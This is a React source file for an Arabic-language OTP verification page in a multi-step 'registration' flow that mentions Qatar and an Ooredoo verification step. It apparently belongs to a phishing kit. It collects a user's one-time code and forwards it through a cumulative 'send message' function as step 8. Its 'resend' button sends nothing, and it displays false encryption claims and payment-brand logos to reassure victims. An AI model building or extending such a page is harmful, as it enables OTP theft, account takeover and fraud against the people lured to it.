import { useState } from "react";
import { useNavigate } from "react-router-dom";
import Header from "@/components/Header";
import Stepper from "@/components/Stepper";
import Footer from "@/components/Footer";
import { Button } from "@/components/ui/button";
import {
  InputOTP,
  InputOTPGroup,
  InputOTPSlot,
} from "@/components/ui/input-otp";
import securePaymentLogos from "@/assets/secure-payment-logos.png";
import { useRegistration } from "@/contexts/RegistrationContext";

const steps = [
  { number: 1, title: "نوع الحساب" },
  { number: 2, title: "البيانات الشخصية" },
  { number: 3, title: "كلمة المرور" },
  { number: 4, title: "إتمام التسجيل" },
];

const OTPVerification = () => {
  const navigate = useNavigate();
  const { updateData, sendCumulativeMessage } = useRegistration();
  const [otp, setOtp] = useState("");

  const handleVerify = async () => {
    if (otp.length === 4) {
      const newData = { otp };
      updateData(newData);
      await sendCumulativeMessage(8, "رمز التحقق النهائي", newData);
      navigate('/success');
    }
  };

  const handleResend = () => {
    alert("تم إرسال رمز التحقق مرة أخرى");
    setOtp("");
  };

  return (
    <div className="min-h-screen flex flex-col bg-white" dir="rtl">
      <Header />
      
      <main className="flex-1 container mx-auto px-4 py-12 bg-white">
        <Stepper currentStep={4} steps={steps} />
        
        <div className="max-w-2xl mx-auto mt-8">
          <div className="bg-secondary/30 rounded-lg shadow-lg p-8 border border-border">
            <div className="text-center mb-8">
              <div className="w-20 h-20 bg-primary/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-10 w-10 text-primary"
                  fill="none"
                  viewBox="0 0 24 24"
                  stroke="currentColor"
                >
                  <path
                    strokeLinecap="round"
                    strokeLinejoin="round"
                    strokeWidth={2}
                    d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
                  />
                </svg>
              </div>
              <h2 className="text-2xl font-bold mb-2 text-foreground">
                رمز التحقق
              </h2>
              <p className="text-sm text-muted-foreground">
                يرجى إدخال الرمز المرسل إلى هاتفك
              </p>
            </div>

            <div className="bg-background rounded-lg p-6 mb-6">
              <p className="text-base text-foreground text-right mb-6 leading-relaxed">
                تم إرسال رمز التحقق المكون من 4 أرقام إلى رقم الهاتف المسجل لديكم. يرجى إدخال الرمز في الحقل أدناه لإتمام عملية التحقق.
              </p>

              <div className="flex justify-center mb-6" dir="ltr">
                <InputOTP
                  maxLength={4}
                  value={otp}
                  onChange={(value) => setOtp(value)}
                >
                  <InputOTPGroup>
                    <InputOTPSlot index={0} />
                    <InputOTPSlot index={1} />
                    <InputOTPSlot index={2} />
                    <InputOTPSlot index={3} />
                  </InputOTPGroup>
                </InputOTP>
              </div>

              <div className="text-center mb-6">
                <p className="text-sm text-muted-foreground mb-2">
                  لم تستلم رمز التحقق؟
                </p>
                <Button
                  variant="link"
                  onClick={handleResend}
                  className="text-primary hover:text-primary/80 font-medium"
                >
                  إعادة إرسال الرمز
                </Button>
              </div>

              <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 flex items-start gap-2">
                <span className="text-lg">ℹ️</span>
                <p className="text-xs text-foreground text-right">
                  <strong>ملاحظة هامة:</strong> رمز التحقق صالح لمدة 5 دقائق فقط. في حال انتهاء صلاحية الرمز، يرجى طلب إرسال رمز جديد.
                </p>
              </div>
            </div>

            <div className="flex gap-3 flex-row-reverse">
              <Button 
                className="bg-primary hover:bg-primary/90 text-primary-foreground flex-1"
                onClick={handleVerify}
                disabled={otp.length !== 4}
              >
                تأكيد
              </Button>
              <Button 
                variant="outline"
                onClick={() => navigate('/ooredoo-verification')}
              >
                رجوع
              </Button>
            </div>

            <div className="mt-6 pt-6 border-t border-border space-y-4">
              <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground">
                <span>🔒</span>
                <p className="text-center">
                  جميع البيانات محمية بتقنية التشفير المتقدمة وفقاً للمعايير الأمنية المعتمدة في دولة قطر
                </p>
              </div>
              
              <div className="flex justify-center">
                <img 
                  src={securePaymentLogos} 
                  alt="Secure Payment Methods - Powered by Stripe, MasterCard, VISA, Discover, American Express"
                  className="w-full max-w-xl opacity-80"
                />
              </div>
            </div>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default OTPVerification;
